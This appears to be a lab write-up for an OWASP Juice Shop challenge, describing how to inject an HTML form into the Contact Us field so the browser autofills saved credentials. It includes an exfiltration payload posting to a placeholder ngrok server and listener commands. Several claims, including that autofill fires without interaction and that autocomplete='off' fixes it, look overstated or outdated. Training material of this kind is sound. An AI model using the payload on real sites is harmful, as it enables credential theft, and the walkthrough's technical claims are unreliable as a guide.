📁 /Method-11_Browser-Autocomplete-Leak/README.md
markdown
Copy code
# 🧠 OWASP Juice Shop Challenge – Browser Autocomplete Leak Exploit

## 🎯 Objective
Leverage the browser’s built-in **form autocomplete mechanism** to extract previously entered sensitive data like credentials. This method focuses on abusing frontend behaviors and browser memory, not server-side vulnerabilities.

---

## 🛠️ TECHNICAL STRATEGY AND THREAT MODEL

Modern browsers store input field data using the `autocomplete` attribute. This attribute controls whether input fields can **auto-populate previously entered values**, such as usernames, emails, or passwords. If developers leave `autocomplete="on"` or omit it entirely (default: on), it can lead to **accidental data disclosure**, especially in shared environments or multi-user systems.

In the Juice Shop app, there are **login and registration pages** that fail to prevent the browser from storing credentials. We exploit this misconfiguration using DOM injection and UI abuse to make the browser auto-fill saved values in unintended input fields—leaking them to a JavaScript-controlled interface.

---

## 🧰 REQUIREMENTS

- Browser: Chrome, Firefox, or Edge (with autocomplete enabled).
- Developer Tools (F12) access.
- Kali Linux (optional) to host custom scripts (not required here).
- Understanding of HTML forms, DOM manipulation, and browser storage APIs.

---

## 🧪 STEP-BY-STEP EXPLOITATION

### 🔹 Step 1: Navigate to Login Page
- Open Juice Shop.
- Click on `Account > Login`.
- Allow your browser to offer the option to **save login credentials** (e.g., `admin@juice-sh.op / admin123`).

### 🧠 What's happening here?
> When the browser detects a `<form>` element with `<input type="email" name="email">` and `<input type="password" name="password">`, it prompts the user to save credentials. If `autocomplete="off"` is **not set**, the browser caches these inputs locally.

---

### 🔹 Step 2: Save the Credentials via Login
- Login once with admin credentials.
- Click “Save Password” when browser prompts.

> 📦 These credentials are now stored locally in browser-managed **autocomplete storage**.

---

### 🔹 Step 3: Trigger the Autocomplete Leak
Now, create a custom HTML form inside the application that tricks the browser into auto-filling credentials into **malicious or visible input fields**.

#### ➤ Where to inject?
- Go to `Contact Us > Message`.
- Enter the following **malicious payload** into the message field:

```html
<form>
  <input name="email" type="email">
  <input name="password" type="password">
</form>
✅ This form, when rendered, triggers browser’s autocomplete engine to autofill cached values.

🔧 Backend Mechanics:
The browser checks DOM elements with <input type="email" name="email"> or <input type="password">.

If names match previously stored fields and match same-origin policy, autofill occurs.

No JavaScript or user interaction is needed if fields are in focus and visible.

🔹 Step 4: Observe Auto-fill
Submit the message or simply reload the contact page.

Open DevTools > Elements Tab (F12), inspect the HTML.

You will see that the email and password fields are auto-populated.

🔹 Step 5: Enhance to Exfiltrate
Modify your payload to send data to an external server:

html
Copy code
<form action="https://your-ngrok-server.com" method="POST">
  <input name="email" type="email">
  <input name="password" type="password">
  <input type="submit">
</form>
Use an ngrok tunnel or a simple HTTP listener to catch requests:

bash
Copy code
sudo python3 -m http.server 80
# or
ngrok http 80
Once the form is auto-filled and user submits unknowingly, credentials are exfiltrated to your server.

💡 DEFENSE BYPASS STRATEGY
This exploit works because:

Autocomplete is enabled by default on most forms.

Browser autofill is triggered even by hidden or injected forms.

Many sites don’t use autocomplete="off" or readonly on sensitive inputs.

This highlights why frontend misconfigurations can cause client-side data leaks, even without backend flaws.

🔐 REMEDIATION GUIDELINES
To prevent autocomplete-based leaks:

Always set:

html
Copy code
<input type="password" autocomplete="off">
Avoid rendering forms dynamically without intention.

Use strict Content-Security-Policy to block inline HTML/script injection.

Consider readonly fields for uneditable sensitive content.

📋 Final Note
This challenge shows a low-complexity, high-impact client-side vulnerability that leverages user trust in browsers. It bypasses most traditional XSS filters and exploits legitimate features misused in malicious contexts.

yaml
Copy code
